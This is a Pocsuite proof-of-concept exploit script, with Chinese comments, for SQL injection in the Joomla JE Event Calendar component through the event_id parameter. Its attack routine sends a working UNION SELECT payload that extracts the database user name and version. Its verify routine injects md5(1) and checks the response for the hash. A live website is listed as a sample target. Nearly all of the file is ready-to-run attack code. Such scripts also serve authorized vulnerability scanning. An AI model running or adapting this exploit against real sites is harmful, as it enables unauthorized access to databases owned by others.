#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '67594'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2010-03-02'
    createDate = '2016-01-05'
    updateDate = '2016-01-05'
    references = ['http://www.sebug.net/vuldb/ssvid-67594']
    name = 'Joomla Component JE Event Calendar SQL Injection Vulnerability'
    appPowerLink = 'http://www.joomla.com'
    appName = 'Joomla Component JE Event Calendar'
    appVersion = 'N/A'
    vulType = 'SQL Injection'
    desc = '''
        Joomla!的组件JE Event Calendars (com_jeeventcalendar)存在SQL注入漏洞。
        远程攻击者可以借助脚本index.php中的事件操作的event_id参数，执行任意的SQL命令。
    '''
    samples = ['http://starstudentcard.com']

    def _attack(self):
        #利用SQL注入读取数据库信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_jeeventcalendar&view=event&Itemid=155&event_id='
        #利用Union方式读取数据库信息
        payload="-1%22+UNION+ALL+SELECT+1,concat(0x247e7e7e24,user(),0x2a2a2a,version(),0x247e7e7e24),3,4,5,6,7,8,9,10,11%23"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查返回结果
        if resp.status_code==200:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['DatabaseInfo']={}
                #数据库用户名
                result['DatabaseInfo']['Username']=match.group(1)
                #数据库版本
                result['DatabaseInfo']['Version']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        #通过计算md5(1)的值，来验证SQL注入
        result = {}
        #访问的地址
        exploit='/index.php?option=com_jeeventcalendar&view=event&Itemid=155&event_id='
        #利用Union方式（计算md5(1)）
        payload="-1%22+UNION+ALL+SELECT+1,md5(1),3,4,5,6,7,8,9,10,11%23"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=50)
        #检查是否含有特征字符串(md5(1)=c4ca4238a0b923820dcc509a6f75849b)
        if 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
            #漏洞验证成功
            result['VerifyInfo']={}
            result['VerifyInfo']['URL'] = self.url+exploit
            result['VerifyInfo']['Payload'] = payload
        return self.parse_output(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)